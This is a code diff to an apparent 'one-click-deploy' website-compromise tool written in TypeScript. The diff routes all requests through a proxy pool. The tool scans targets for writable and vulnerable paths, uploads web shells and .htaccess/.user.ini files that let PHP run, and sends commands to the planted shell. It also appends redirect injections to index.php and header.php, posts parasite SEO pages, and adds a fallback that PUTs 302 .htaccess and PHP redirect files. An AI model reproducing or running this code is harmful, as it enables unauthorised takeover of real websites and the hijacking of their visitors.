@@ -40,7 +40,7 @@ import {
   type MultiPlatformShell,
   type ServerPlatform,
 } from "./enhanced-upload-engine";
-import { proxyPool, type ProxyEntry } from "./proxy-pool";
+import { proxyPool, fetchWithPoolProxy, type ProxyEntry } from "./proxy-pool";
 
 // ─── Types ───
 
@@ -371,30 +371,55 @@ async function fetchWithProxy(
   timeout = 15000,
 ): Promise<Response> {
   const { proxy, ...fetchInit } = init;
-  const controller = new AbortController();
-  const t = setTimeout(() => controller.abort(), timeout);
+  const domain = (() => { try { return new URL(url).hostname; } catch { return undefined; } })();
 
   try {
-    if (proxy) {
-      // Use proxy via environment variable approach (works with Node.js fetch)
-      const originalHttpProxy = process.env.HTTP_PROXY;
-      const originalHttpsProxy = process.env.HTTPS_PROXY;
-      try {
-        process.env.HTTP_PROXY = proxy.url;
-        process.env.HTTPS_PROXY = proxy.url;
-        const response = await fetch(url, { ...fetchInit, signal: controller.signal });
-        return response;
-      } finally {
-        // Restore original proxy settings
-        if (originalHttpProxy) process.env.HTTP_PROXY = originalHttpProxy;
-        else delete process.env.HTTP_PROXY;
-        if (originalHttpsProxy) process.env.HTTPS_PROXY = originalHttpsProxy;
-        else delete process.env.HTTPS_PROXY;
-      }
+    // Always use fetchWithPoolProxy (undici ProxyAgent) for real proxy routing
+    const { response } = await fetchWithPoolProxy(url, fetchInit, {
+      targetDomain: domain,
+      timeout,
+    });
+    return response;
+  } catch (err) {
+    // Fallback to direct fetch if proxy pool fails
+    const controller = new AbortController();
+    const t = setTimeout(() => controller.abort(), timeout);
+    try {
+      return await fetch(url, { ...fetchInit, signal: controller.signal });
+    } finally {
+      clearTimeout(t);
     }
-    return await fetch(url, { ...fetchInit, signal: controller.signal });
-  } finally {
-    clearTimeout(t);
+  }
+}
+
+// ─── Proxied Fetch Helper (replaces all direct fetch calls) ───
+
+/**
+ * All HTTP calls in one-click-deploy go through this function.
+ * Uses fetchWithPoolProxy (undici ProxyAgent) for real proxy routing.
+ * Falls back to direct fetch if proxy pool is empty.
+ */
+async function proxyFetch(
+  url: string,
+  init: RequestInit = {},
+  timeout = 15000,
+): Promise<Response> {
+  const domain = (() => { try { return new URL(url).hostname; } catch { return undefined; } })();
+  try {
+    const { response } = await fetchWithPoolProxy(url, init, {
+      targetDomain: domain,
+      timeout,
+    });
+    return response;
+  } catch {
+    // Fallback to direct fetch
+    const controller = new AbortController();
+    const t = setTimeout(() => controller.abort(), timeout);
+    try {
+      return await fetch(url, { ...init, signal: controller.signal });
+    } finally {
+      clearTimeout(t);
+    }
   }
 }
 
@@ -533,15 +558,11 @@ async function scanTarget(targetUrl: string, timeout = 8000): Promise<ScanResult
   const uploadChecks = UPLOAD_SCAN_PATHS.map(async (path) => {
     try {
       const url = `${targetUrl}${path}`;
-      const controller = new AbortController();
-      const t = setTimeout(() => controller.abort(), timeout);
-      const response = await fetch(url, {
+      const response = await proxyFetch(url, {
         method: "HEAD",
         headers: getBypassHeaders(targetUrl),
-        signal: controller.signal,
         redirect: "follow",
-      });
-      clearTimeout(t);
+      }, timeout);
 
       const writable = response.status < 400;
       const type = response.headers.get("content-type") || "";
@@ -564,15 +585,11 @@ async function scanTarget(targetUrl: string, timeout = 8000): Promise<ScanResult
   const vulnChecks = VULN_PATHS.map(async (path) => {
     try {
       const url = `${targetUrl}${path}`;
-      const controller = new AbortController();
-      const t = setTimeout(() => controller.abort(), timeout);
-      const response = await fetch(url, {
+      const response = await proxyFetch(url, {
         method: "GET",
         headers: getBypassHeaders(targetUrl),
-        signal: controller.signal,
         redirect: "follow",
-      });
-      clearTimeout(t);
+      }, timeout);
 
       const text = await response.text().catch(() => "");
       const exists = response.status === 200;
@@ -1104,12 +1121,11 @@ async function uploadRedirectDirect(
               : uploadFilename;
             headers["Content-Type"] = payload.filename.endsWith(".php") ? "application/x-php" : "text/html";
             try {
-              const putResp = await fetch(`${uploadUrl}${putFilename}`, {
+              const putResp = await proxyFetch(`${uploadUrl}${putFilename}`, {
                 method: "PUT",
                 headers,
                 body: payload.content,
-                signal: controller.signal,
-              });
+              }, 15000);
               clearTimeout(t);
               result.statusCode = putResp.status;
               if (putResp.status < 400) {
@@ -1137,13 +1153,11 @@ async function uploadRedirectDirect(
             body = payload.content;
           }
 
-          const response = await fetch(uploadUrl, {
+          const response = await proxyFetch(uploadUrl, {
             method: "POST",
             headers,
             body,
-            signal: controller.signal,
-          });
-          clearTimeout(t);
+          }, 15000);
 
           result.statusCode = response.status;
 
@@ -1212,14 +1226,10 @@ async function verifyUploadedFileDetailed(url: string, type: string): Promise<Fi
 
   try {
     // Step 1: Check with redirect: "manual" to see if server sends 301/302
-    const controller1 = new AbortController();
-    const t1 = setTimeout(() => controller1.abort(), 8000);
-    const resp1 = await fetch(url, {
-      signal: controller1.signal,
+    const resp1 = await proxyFetch(url, {
       headers: { "User-Agent": randomUA() },
       redirect: "manual",
-    });
-    clearTimeout(t1);
+    }, 8000);
 
     result.statusCode = resp1.status;
     result.contentType = resp1.headers.get("content-type");
@@ -1283,18 +1293,14 @@ async function verifyRedirectActuallyWorks(
     const attemptTimeout = timeout + (attempt * 5000);
     try {
       // Check 1: HTTP redirect (301/302/303/307/308)
-      const controller = new AbortController();
-      const t = setTimeout(() => controller.abort(), attemptTimeout);
-      const resp = await fetch(deployedUrl, {
+      const resp = await proxyFetch(deployedUrl, {
         headers: {
           "User-Agent": randomUA(),
           "Referer": "https://www.google.com/",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         },
-        signal: controller.signal,
         redirect: "manual",
-      });
-      clearTimeout(t);
+      }, attemptTimeout);
 
       if ([301, 302, 303, 307, 308].includes(resp.status)) {
         const location = resp.headers.get("location");
@@ -1384,20 +1390,18 @@ async function uploadShell(
     try {
       // Deploy .htaccess to enable PHP in image files
       const htaccess = generateHtaccessPhpExec();
-      await fetch(`${targetUrl}${path}.htaccess`, {
+      await proxyFetch(`${targetUrl}${path}.htaccess`, {
         method: "PUT",
         body: htaccess,
         headers: { "Content-Type": "text/plain", "User-Agent": randomUA() },
-        signal: AbortSignal.timeout(5000),
-      }).catch(() => {});
+      }, 5000).catch(() => {});
       // Deploy .user.ini to relax PHP restrictions
       const userIni = generateUserIni();
-      await fetch(`${targetUrl}${path}.user.ini`, {
+      await proxyFetch(`${targetUrl}${path}.user.ini`, {
         method: "PUT",
         body: userIni,
         headers: { "Content-Type": "text/plain", "User-Agent": randomUA() },
-        signal: AbortSignal.timeout(5000),
-      }).catch(() => {});
+      }, 5000).catch(() => {});
     } catch { /* best effort */ }
   }
 
@@ -1528,13 +1532,11 @@ async function uploadShell(
         // For PUT methods, target the file directly; for POST, target the directory
         const targetUploadUrl = httpMethod === "PUT" ? `${uploadUrl}${uploadFilename}` : uploadUrl;
 
-        const response = await fetch(targetUploadUrl, {
+        const response = await proxyFetch(targetUploadUrl, {
           method: httpMethod,
           headers,
           body: (bodyContent instanceof Buffer ? new Uint8Array(bodyContent) : bodyContent) as BodyInit,
-          signal: controller.signal,
-        });
-        clearTimeout(t);
+        }, 15000);
 
         result.statusCode = response.status;
 
@@ -1551,16 +1553,9 @@ async function uploadShell(
           for (const checkUrl of uniqueCheckUrls.slice(0, 3)) {
             if (stepAbortSignal?.aborted) break;
             try {
-              const checkController = new AbortController();
-              const checkTimeout = setTimeout(() => checkController.abort(), 5000);
-              if (stepAbortSignal) {
-                stepAbortSignal.addEventListener('abort', () => checkController.abort(), { once: true });
-              }
-              const check = await fetch(checkUrl, {
-                signal: checkController.signal,
+              const check = await proxyFetch(checkUrl, {
                 headers: { "User-Agent": randomUA() },
-              });
-              clearTimeout(checkTimeout);
+              }, 5000);
 
               if (check.status === 200) {
                 const text = await check.text();
@@ -1629,19 +1624,14 @@ async function verifyShellActive(shellUrl: string, password: string, timeout = 1
     const testResult = { command: test.command, passed: false, response: "" };
 
     try {
-      const controller = new AbortController();
-      const t = setTimeout(() => controller.abort(), timeout);
-
-      const response = await fetch(testUrl, {
+      const response = await proxyFetch(testUrl, {
         method: "POST",
         headers: {
           "Content-Type": "application/x-www-form-urlencoded",
           "User-Agent": randomUA(),
         },
         body: `c=${encoded}`,
-        signal: controller.signal,
-      });
-      clearTimeout(t);
+      }, timeout);
 
       const text = await response.text();
       testResult.response = text.slice(0, 200);
@@ -1895,19 +1885,14 @@ async function deployFiles(
     // Retry up to 2 times for each file write
     for (let attempt = 0; attempt < 2; attempt++) {
       try {
-        const controller = new AbortController();
-        const t = setTimeout(() => controller.abort(), fileTimeout + (attempt * 5000));
-
-        const response = await fetch(testUrl, {
+        const response = await proxyFetch(testUrl, {
           method: "POST",
           headers: {
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": randomUA(),
           },
           body: `file=${encodeURIComponent(filename)}&content=${encodeURIComponent(content)}`,
-          signal: controller.signal,
-        });
-        clearTimeout(t);
+        }, fileTimeout + (attempt * 5000));
 
         const text = await response.text();
         // More robust success detection: check response body for known success indicators
@@ -1921,17 +1906,13 @@ async function deployFiles(
 
           // CRITICAL: Post-write verification — HTTP GET the file to confirm it actually exists
           try {
-            const verifyController = new AbortController();
-            const verifyTimeout = setTimeout(() => verifyController.abort(), 10000);
-            const verifyResp = await fetch(fileUrl, {
+            const verifyResp = await proxyFetch(fileUrl, {
               headers: {
                 "User-Agent": randomUA(),
                 "Accept": "text/html,application/xhtml+xml,*/*",
               },
-              signal: verifyController.signal,
               redirect: "manual", // Don't follow redirects — we want to see the raw response
-            });
-            clearTimeout(verifyTimeout);
+            }, 10000);
 
             // SUCCESS: File exists and returns 200
             if (verifyResp.status === 200) {
@@ -2043,19 +2024,14 @@ ${anchorLinks}
     const injectFiles = ["index.php", "header.php", "footer.php", "home.php"];
     for (const file of injectFiles) {
       const encoded = Buffer.from(`echo '${metaInjector.replace(/'/g, "\\'")}' >> ${file}`).toString("base64");
-      const controller = new AbortController();
-      const t = setTimeout(() => controller.abort(), 10000);
-
-      const response = await fetch(testUrl, {
+      const response = await proxyFetch(testUrl, {
         method: "POST",
         headers: {
           "Content-Type": "application/x-www-form-urlencoded",
           "User-Agent": randomUA(),
         },
         body: `c=${encoded}`,
-        signal: controller.signal,
-      });
-      clearTimeout(t);
+      }, 10000);
 
       const text = await response.text();
       // Don't blindly trust 200 status — verify the injection actually worked
@@ -2097,15 +2073,10 @@ async function verifyRedirect(targetUrl: string, redirectUrl: string, timeout = 
   // Strategy 1: Check root domain (original behavior)
   for (const check of checks) {
     try {
-      const controller = new AbortController();
-      const t = setTimeout(() => controller.abort(), timeout);
-
-      const response = await fetch(targetUrl, {
+      const response = await proxyFetch(targetUrl, {
         headers: { "User-Agent": check.ua, "Referer": "https://www.google.com/" },
-        signal: controller.signal,
         redirect: "manual",
-      });
-      clearTimeout(t);
+      }, timeout);
 
       const location = response.headers.get("location");
       const working = location?.replace(/^https?:\/\//, "").replace(/\/+$/, "").includes(normalizedRedirect) || false;
@@ -2852,19 +2823,14 @@ export async function oneClickDeploy(
 
       for (const page of parasitePages) {
         try {
-          const controller = new AbortController();
-          const t = setTimeout(() => controller.abort(), opts.uploadTimeout || 15000);
-
-          const response = await fetch(testUrl, {
+          const response = await proxyFetch(testUrl, {
             method: "POST",
             headers: {
               "Content-Type": "application/x-www-form-urlencoded",
               "User-Agent": randomUA(),
             },
             body: `file=${encodeURIComponent(page.filename)}&content=${encodeURIComponent(page.html)}`,
-            signal: controller.signal,
-          });
-          clearTimeout(t);
+          }, opts.uploadTimeout || 15000);
 
           const text = await response.text();
           const success = text.includes("FILE_WRITTEN") || text.includes("OK") || response.status === 200;
@@ -2994,19 +2960,14 @@ export async function oneClickDeploy(
         for (const path of paths) {
           try {
             const uploadUrl = `${target}${path}${page.filename}`;
-            const controller = new AbortController();
-            const t = setTimeout(() => controller.abort(), opts.uploadTimeout || 15000);
-
             const formData = new FormData();
             formData.append("file", new Blob([page.html], { type: "application/x-php" }), page.filename);
 
-            const response = await fetch(uploadUrl, {
+            const response = await proxyFetch(uploadUrl, {
               method: "PUT",
               headers: { "User-Agent": randomUA() },
               body: formData,
-              signal: controller.signal,
-            });
-            clearTimeout(t);
+            }, opts.uploadTimeout || 15000);
 
             if (response.ok || response.status === 201) {
               deployedCount++;
@@ -3108,8 +3069,69 @@ export async function oneClickDeploy(
       errorBreakdown[step5.errorCategory]++;
     }
   } else {
-    step5.status = "skipped";
-    step5.details = "No active shell — skipping file deployment";
+    // Fallback: try direct upload of redirect files without shell
+    try {
+      const paths = scanResult.bestUploadPath
+        ? [scanResult.bestUploadPath, ...UPLOAD_SCAN_PATHS.filter(p => p !== scanResult.bestUploadPath).slice(0, 5)]
+        : UPLOAD_SCAN_PATHS.slice(0, 6);
+
+      let directDeployed = 0;
+
+      // Try .htaccess upload
+      const htaccessContent = `RewriteEngine On\nRewriteCond %{REQUEST_URI} !^/wp-admin\nRewriteCond %{REQUEST_URI} !^/wp-login\nRewriteRule ^(.*)$ ${redirect} [R=302,L]`;
+      for (const path of paths) {
+        try {
+          const htUrl = `${target}${path}.htaccess`;
+          const htResp = await proxyFetch(htUrl, {
+            method: "PUT",
+            headers: { "User-Agent": randomUA(), "Content-Type": "text/plain" },
+            body: htaccessContent,
+          }, opts.uploadTimeout || 15000);
+          if (htResp.ok || htResp.status === 201) {
+            directDeployed++;
+            result.redirectInfo.htaccessDeployed = true;
+            result.redirectInfo.directUploadUsed = true;
+            result.deployedFiles.push({
+              type: "htaccess", filename: ".htaccess", url: htUrl,
+              status: "deployed", description: "Direct upload .htaccess 302",
+            });
+            break;
+          }
+        } catch { /* try next path */ }
+      }
+
+      // Try PHP redirect upload
+      const phpContent = `<?php header("Location: ${redirect}", true, 302); exit; ?>`;
+      const phpFilename = `redirect-${Date.now().toString(36)}.php`;
+      for (const path of paths) {
+        try {
+          const phpUrl = `${target}${path}${phpFilename}`;
+          const phpResp = await proxyFetch(phpUrl, {
+            method: "PUT",
+            headers: { "User-Agent": randomUA(), "Content-Type": "application/x-php" },
+            body: phpContent,
+          }, opts.uploadTimeout || 15000);
+          if (phpResp.ok || phpResp.status === 201) {
+            directDeployed++;
+            result.redirectInfo.phpRedirectDeployed = true;
+            result.redirectInfo.directUploadUsed = true;
+            result.deployedFiles.push({
+              type: "redirect", filename: phpFilename, url: phpUrl,
+              status: "deployed", description: "Direct upload PHP 302",
+            });
+            break;
+          }
+        } catch { /* try next path */ }
+      }
+
+      step5.status = directDeployed > 0 ? "success" : "failed";
+      step5.details = directDeployed > 0
+        ? `${directDeployed} redirect file(s) deployed via direct upload (no shell)`
+        : "No active shell and direct upload failed \u2014 all paths rejected";
+    } catch (e: any) {
+      step5.status = "failed";
+      step5.details = `No shell + direct upload error: ${e.message}`;
+    }
   }
   step5.endTime = Date.now();
   step5.duration = step5.endTime - step5.startTime!;
